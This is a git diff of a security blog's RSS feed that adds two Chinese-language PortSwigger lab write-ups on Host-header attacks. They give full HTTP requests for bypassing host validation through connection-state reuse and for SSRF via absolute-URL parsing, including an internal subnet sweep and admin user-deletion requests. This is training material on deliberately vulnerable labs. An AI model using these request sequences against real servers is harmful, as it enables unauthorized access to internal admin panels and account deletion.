@@ -1,4 +1,81 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on en1r0py</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 23 Dec 2024 22:12:47 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Routing-based SSRF</title><link>/posts/2024/host-header-attack-lab-host-header-routing-based-ssrf/</link><pubDate>Mon, 23 Dec 2024 22:12:47 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-host-header-routing-based-ssrf/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on en1r0py</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 24 Dec 2024 22:52:26 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Host validation bypass via connection state attack</title><link>/posts/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack/</link><pubDate>Tue, 24 Dec 2024 22:52:26 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>尝试使用&lt;code>/admin&lt;/code>、&lt;code>192.168.0.1&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>在Burp Repeater分页点击右键、&lt;code>Add tab to group&lt;/code>、&lt;code>Create tab group&lt;/code>，并将原本的分页加入group，请求如下
+&lt;img alt="Tab group" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-2.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0ae100d7040562ed8135392700a6005b.h1-web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">keep-alive&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>选择原本的分页点击右键、&lt;code>Duplicate tab&lt;/code>，将请求修改如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改请求发送模式为&lt;code>Send group in sequence (single connection)&lt;/code>，并发送请求序列，第二个tab的返回为
+&lt;img alt="Send mode" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-3.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;form style=&amp;#39;margin-top: 1em&amp;#39; class=&amp;#39;login-form&amp;#39; action=&amp;#39;/admin/delete&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;doLsmDgX8pDrr84pLwuQ68V98cQoYGpq&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;label&amp;gt;Username&amp;lt;/label&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#39;text&amp;#39; name=&amp;#39;username&amp;#39;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;button class=&amp;#39;button&amp;#39; type=&amp;#39;submit&amp;#39;&amp;gt;Delete user&amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/form&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>参考上述返回，修改第二个tab的请求，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin/delete &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=doLsmDgX8pDrr84pLwuQ68V98cQoYGpq&amp;amp;username=carlos
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF via flawed request parsing</title><link>/posts/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing/</link><pubDate>Tue, 24 Dec 2024 22:22:14 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击Burp Collaborator中的&lt;code>Copy to clipboard&lt;/code>，并修改首页请求
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">w41el7hll9h1f0wkpaxy7qjeq5wxkn8c.oastify.com&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试使用绝对路径请求
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gk4y1rx51txlvkc45udinazy6pch08ox.oastify.com&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>在Burp Collaborator页面可以发现有对应的DNS请求记录，可以确认网站的中间件会向任意服务器发出请求
+&lt;img alt="Burp Collaborator" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-2.jpg">&lt;/li>
+&lt;li>使用Burp Intruder进行&lt;code>192.168.0.0/24&lt;/code>遍历，请求与Payload如下，记得反选Update Host header to match target
+&lt;img alt="Burp Intruder" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-3.jpg">&lt;/li>
+&lt;li>根据扫描结果&lt;code>192.168.0.102&lt;/code>会跳转至&lt;code>/admin&lt;/code>，发送请求
+&lt;img alt="Burp Intruder" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-4.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net/admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.102&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;form style=&amp;#39;margin-top: 1em&amp;#39; class=&amp;#39;login-form&amp;#39; action=&amp;#39;/admin/delete&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;vDi8dR8n51eHQdfTlYMGnZMeE4kyqV3Y&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;label&amp;gt;Username&amp;lt;/label&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#39;text&amp;#39; name=&amp;#39;username&amp;#39;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;button class=&amp;#39;button&amp;#39; type=&amp;#39;submit&amp;#39;&amp;gt;Delete user&amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/form&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>根据上述结果修改请求&lt;code>POST /admin/delete&lt;/code>、&lt;code>csrf&lt;/code>，并新增&lt;code>username&lt;/code>参数，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net/admin/delete &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.102&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=vDi8dR8n51eHQdfTlYMGnZMeE4kyqV3Y&amp;amp;username=carlos
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Routing-based SSRF</title><link>/posts/2024/host-header-attack-lab-host-header-routing-based-ssrf/</link><pubDate>Mon, 23 Dec 2024 22:12:47 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-host-header-routing-based-ssrf/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
